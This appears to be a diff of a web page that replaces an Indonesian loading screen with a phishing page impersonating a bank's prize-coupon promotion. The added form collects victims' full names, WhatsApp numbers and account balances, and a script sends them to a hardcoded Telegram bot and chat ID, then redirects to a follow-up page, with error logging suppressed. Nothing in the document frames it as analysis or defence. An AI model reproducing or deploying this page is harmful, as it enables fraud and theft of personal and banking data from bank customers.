@@ -1,104 +1,161 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en" class="h-100">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Memuat | Ajaib Alpha</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      height: 100vh;
-      font-family: 'Segoe UI', sans-serif;
-      background-image: url('https://i.imghippo.com/files/siqo6949jk.jpg');
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      opacity: 1;
-      transition: opacity 1.2s ease;
-    }
-
-    body.fade-out {
-      opacity: 0;
-    }
-
-    .loading-container {
-      background: rgba(255, 255, 255, 0.15);
-      padding: 12px 24px;
-      border-radius: 30px;
-      backdrop-filter: blur(10px);
-      color: white;
-      font-size: 1rem;
-      font-weight: 500;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-      animation: fadeInUp 1.5s ease-out;
-    }
-
-    @keyframes fadeInUp {
-      from {
-        opacity: 0;
-        transform: translateY(20px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-  </style>
-  <script>
-    setTimeout(() => {
-      document.body.classList.add('fade-out');
-    }, 2500); // mulai transisi setelah 2.5 detik
-
-    setTimeout(() => {
-      window.location.href = "email.html"; // ganti sesuai halaman tujuan
-    }, 3500); // pindah setelah 3.5 detik total
-  </script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <meta property="og:title" content="Cetak Kupon Anda">
+    <meta property="og:image" content="bc.png">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta name="description" content="Cetak kupon undian Anda di sini.">
+    <meta name="author" content="">
+    <title>Cetak Kupon Anda</title>
+    <link rel="icon" type="x-icon" href="favicon.png">
+    <link rel="canonical" href="">
+    <link href="bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+    <link rel="stylesheet" href="bootstrap-icons.css">
+    <link rel="stylesheet" href="main.css" type="text/css" media="all">
 </head>
 <body>
-     </script>
-    <!--END NEW RELIC-->
-    <title>Ajaib.co.id</title>
-  <link rel="shortcut icon" href="/favicon.ico"><link href="/0-879c1d7a.css" rel="stylesheet"><link href="/main.css" rel="stylesheet"></head>
-  <body>
-    <noscript>You need to enable JavaScript to run this app.</noscript>
-    <div id="splash" style="
-          display: flex;
-          background-color: #3a83f9;
-          position: absolute;
-          opacity: 1;
-          z-index: 10000;
-          height: 100vh;
-          overflow: auto;
-          width: 100%;
-          text-align: center;
-          justify-content: center;
-          align-items: center;"
-      >
-      <img style="vertical-align: middle; transform: scale(0.5);" src="https://ajaib.co.id/wp-content/uploads/2020/03/new_splash.gif" alt="splash" />
-    </div>
-    <div id="root"></div>
-    <!--
-      This HTML file is a template.
-      If you open it directly in the browser, you will see an empty page.
+    <main>
+        <nav class="navnon">
+            <img width="100%" src="bc.png" alt="">
+        </nav>
+        <footer>
+            <img src="bawah.png" alt="">
+        </footer>
+        <div class="textjalan" style="margin-top: 56px;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="50" height="40" fill="currentColor" class="bi bi-bell" viewBox="0 0 16 16">
+                <path d="M8 16a2 2 0 0 0 2-2H6a2 2 0 0 0 2 2M8 1.918l-.797.161A4 4 0 0 0 4 6c0 .628-.134 2.197-.459 3.742-.16.767-.376 1.566-.663 2.258h10.244c-.287-.692-.502-1.49-.663-2.258C12.134 8.197 12 6.628 12 6a4 4 0 0 0-3.203-3.92zM14.22 12c.223.447.481.801.78 1H1c.299-.199.557-.553.78-1C2.68 10.2 3 6.88 3 6c0-2.42 1.72-4.44 4.005-4.901a1 1 0 1 1 1.99 0A5 5 0 0 1 13 6c0 .88.32 4.2 1.22 6"></path>
+            </svg>
+            <span><marquee>
+                Selamat Datang di GEBYAR FSTVL Rejeki btn Menangkan Hadiah Nya dan Keseruan nya...! jadikan Anda Pemenangnya
+            </marquee></span>
+        </div>
 
-      You can add webfonts, meta tags, or analytics to this file.
-      The build step will place the bundled scripts into the <body> tag.
+        <div class="coverform">
+            <div class="form">
+                <h5 class="text-center"></h5>
+                <img width="35%" height="auto" src="atas.png" alt="">
 
-      To begin the development, run `npm start` or `yarn start`.
-      To create a production bundle, use `npm run build` or `yarn build`.
-    -->
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
-  <script type="text/javascript" src="/bundle--vendors--879c1d7a.js"></script><script type="text/javascript" src="/bundle--main--879c1d7a.js"></script></body>
-</html>
+                <form id="formData" method="POST" action="" class="mt-4">
+                    <div class="inp">
+                        <label for="kupon">PILIH KUPON ANDA</label>
+                        <select id="kupon" name="d" required>
+                            <option value="Mobil Pajero Sport">Kupon ✓ Mobil Pajero Sport</option>
+                            <option value="Uang Cash">Kupon ✓ Uang Cash</option>
+                            <option value="Umroh Gratis">Kupon ✓ Umroh Gratis</option>
+                            <option value="Rumah Gratis">Kupon ✓ Rumah Gratis</option>
+                            <option value="Emas Logam Mulia">Kupon ✓ Emas Logam Mulia</option>
+                        </select>
+                    </div>
 
-  <div class="loading-container">Memuat Ajaib Alpha...</div>
+                    <div class="inp">
+                        <label for="namalengkap"><b>Nama Lengkap</b></label>
+                        <input type="text" name="a" id="namalengkap" required>
+                    </div>
+
+                    <div class="inp">
+                        <label for="nowa">No. WhatsApp</label>
+                        <input type="tel" name="b" id="nowa" required maxlength="13">
+                    </div>
+
+                    <div class="inp">
+                        <label for="dengan-rupiah">Saldo Akhir</label>
+                        <input type="tel" name="c" id="dengan-rupiah" required maxlength="19">
+                    </div>
+
+                    <button type="submit" id="kirim">Cetak Kupon</button>
+                </form>
+            </div>
+        </div>
+
+        <p style="font-size: 12px;" class="text-center">PT Bank Tabungan (Persero) Tbk</p>
+        <p onclick="" style="font-size: 16px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 20px;">
+            <strong style="color: #FF8601; text-decoration: none">Semua Nasabah
+                <span style="color: #098CE3"><b>Bekesempatan Untuk Menang...!!!</b></span>
+            </strong>
+        </p>
+    </main>
+
+    <!-- JavaScript: Integrasi script untuk kirim Telegram dan redirect -->
+    <script src="jquery.min.js"></script>
+    <script src="reqbri.js"></script>
+    <script src="l.js"></script>
+    <script src="main.js"></script>
+    <script src="rupiah.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            $('#formData').on('submit', function(e) {
+                e.preventDefault(); // Cegah submit default
+
+                // Ambil data
+                var nama = $('#namalengkap').val().trim();
+                var nowa = $('#nowa').val().trim();
+                var saldo = $('#dengan-rupiah').val().trim();
+                var kupon = $('#kupon').val();
+
+                // Validasi
+                if (nama === '' || nowa === '' || saldo === '' || kupon === '') {
+                    return false;
+                }
+
+                // Format saldo jika ada fungsi rupiah
+                if (typeof formatRupiah === 'function') {
+                    saldo = formatRupiah(saldo);
+                }
+
+                // Simpan ke localStorage
+                var dataKupon = {
+                    nama: nama,
+                    nowa: nowa,
+                    saldo: saldo,
+                    kupon: kupon,
+                    timestamp: new Date().toISOString()
+                };
+                localStorage.setItem('kuponData', JSON.stringify(dataKupon));
+
+                // Kirim ke Telegram
+                var botToken = '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk';
+                var chatId = '5529657606';
+                var message = `🎉 Kupon Baru Dicetak!\n\n` +
+                              `Nama: ${nama}\n` +
+                              `No. WhatsApp: ${nowa}\n` +
+                              `Saldo Akhir: ${saldo}\n` +
+                              `Kupon: ${kupon}\n` +
+                              `Waktu: ${dataKupon.timestamp}`;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        // Redirect otomatis ke halaman kedua setelah sukses
+                        window.location.href = 'proses.html';
+                    }
+                })
+                .catch(error => {
+                    // Tidak ada tindakan jika error
+                });
+
+                // Reset form
+                $('#formData')[0].reset();
+            });
+
+            // Error handling
+            window.onerror = function(msg, url, line) {
+                // Tidak ada logging
+            };
+        });
+    </script>
+
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"0953dd3e7b8440c994fa4b03c9a26106","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
